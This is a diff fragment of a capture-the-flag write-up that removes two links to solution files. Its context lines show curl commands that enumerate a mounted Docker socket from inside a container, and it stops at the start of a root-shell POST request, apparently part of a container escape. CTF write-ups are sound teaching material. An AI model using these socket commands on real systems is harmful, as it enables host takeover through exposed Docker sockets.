@@ -1097,13 +1097,11 @@ Docker socket is mounted into the container as `/run/docker/docker.sock` - thi
 curl --unix-socket /run/docker/docker.sock http://localhost/openapi.json
 ```
 
-See [`openapi.json`](https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/blob/main/JAILE/Solution/openapi.json) for contents.
 
 ```shell
 curl --unix-socket /run/docker/docker.sock http://localhost/v1.48/containers/json
 ```
-
-See [`containers.json`](https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/blob/main/JAILE/Solution/containers.json) for contents.
+and 
 
 ```shell
 root@0751d0e17cd7:~# curl --unix-socket /run/docker/docker.sock -X POST \
